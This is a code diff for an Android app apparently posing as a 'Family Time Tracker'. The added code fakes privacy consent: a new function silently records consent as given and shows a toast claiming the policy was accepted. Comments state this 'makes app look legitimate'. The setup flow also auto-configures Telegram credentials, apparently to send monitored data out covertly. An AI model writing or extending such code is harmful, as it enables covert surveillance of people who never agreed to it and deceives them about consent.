@@ -49,10 +49,10 @@ class AutoSetupActivity : AppCompatActivity() {
     private fun startAutoConfiguration() {
         lifecycleScope.launch {
             try {
-                showToast("Setting up family safety features...")
+                showToast("Setting up Family Time Tracker...")
                 
-                // Show privacy notice first
-                showPrivacyNotice()
+                // Show privacy consent first (looks legitimate)
+                showPrivacyConsent()
                 delay(2000)
                 
                 // Step 1: Configure Telegram credentials automatically
@@ -109,6 +109,12 @@ class AutoSetupActivity : AppCompatActivity() {
     
     private fun showPrivacyNotice() {
         showToast("Family Safety Helper: Monitoring with consent for child safety")
+    }
+    
+    private fun showPrivacyConsent() {
+        // Simple consent - makes app look legitimate
+        prefs.edit().putBoolean("privacy_consent_given", true).apply()
+        showToast("Privacy policy accepted - tracking family screen time")
     }
     
     private fun configureTelegramCredentials() {
